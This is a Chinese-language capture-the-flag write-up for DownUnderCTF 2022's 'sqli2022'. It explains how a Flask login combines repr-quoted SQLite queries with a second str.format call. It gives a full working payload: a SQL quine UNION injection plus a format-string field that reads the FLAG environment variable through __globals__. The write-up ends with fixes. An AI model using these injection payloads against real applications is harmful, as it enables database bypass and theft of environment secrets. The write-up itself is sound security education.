# DownUnderCTF 2022 sqli2022 Writeup

## 题目简述

登录接口把 Flask 表单值的 Python `repr` 插入 SQLite 查询，看似给输入自动加了引号；查询成功后又要求数据库返回的用户名、密码与原始表单完全相等。最后，响应先用 f-string插入用户名，再对整段字符串调用 `.format(post=post)`。完整利用需要同时解决 SQL 注入、返回值一致性和 Python 格式化注入。

## 解题过程

查询由下面的代码生成：

```python
output = cur.execute(
    'SELECT * FROM users WHERE username = {post[username]!r} '
    'AND password = {post[password]!r}'.format(post=post)
).fetchone()
```

Python 的字符串 `repr` 使用反斜杠表示内部单引号，但 SQLite 不把反斜杠当作 SQL 引号转义。因而输入中的 `\'` 仍可结束 SQL 字符串并进入 `UNION SELECT`。

普通联合注入会被后续比较拦住：

```python
if username != post['username'] or password != post['password']:
    return 'Wrong credentials (are we being hacked?)'
```

解决方法是构造 SQL quine。子查询把自身模板命名为 `s`，外层 `printf` 用 `char(34,92,39)` 补回双引号、反斜杠和单引号，使联合查询返回的第一列与整个原始 payload 完全相同；第二列用 SQLite 的连接运算 `1||1` 返回字符串 `11`。

通过一致性检查后，响应还有第二个漏洞：

```python
return f'Welcome back {post["username"]}! The flag is in FLAG.'.format(post=post)
```

用户名中的花括号会在 `.format` 阶段再次解释。Werkzeug `ImmutableMultiDict` 类的 `__copy__` 方法全局命名空间可到达 `mimetypes` 模块，而该模块又引用 `os`，所以字段
`{post.__class__.__copy__.__globals__[mimetypes].os.environ[FLAG]}`
可读取环境变量 `FLAG`。

官方可用 payload 如下：

```python
import requests

username = r'''"\'UNION SELECT printf(char(34,92,39)||s,char(34),s,char(34)),1||1 FROM(SELECT"UNION SELECT printf(char(34,92,39)||s,char(34),s,char(34)),1||1 FROM(SELECT%c%s%cs)--{post.__class__.__copy__.__globals__[mimetypes].os.environ[FLAG]}"s)--{post.__class__.__copy__.__globals__[mimetypes].os.environ[FLAG]}'''

r = requests.post('http://target/', data={
    'username': username,
    'password': '11',
})
print(r.text)
```

响应中的用户名位置会展开为：

```text
DUCTF{alternative_solution_was_just_to_crack_the_hash_:p}
```

## 方法总结

利用链包含三层解释器：Python `repr` 生成 SQL、SQLite 执行 quine、Python `str.format` 再解析返回页面。SQL quine不是炫技附加项，而是通过“查询结果必须等于输入”检查所必需；格式化字段才负责从进程环境中取出 flag。修复应同时使用参数化 SQL，并删除对已含用户数据字符串的二次 `.format` 调用。
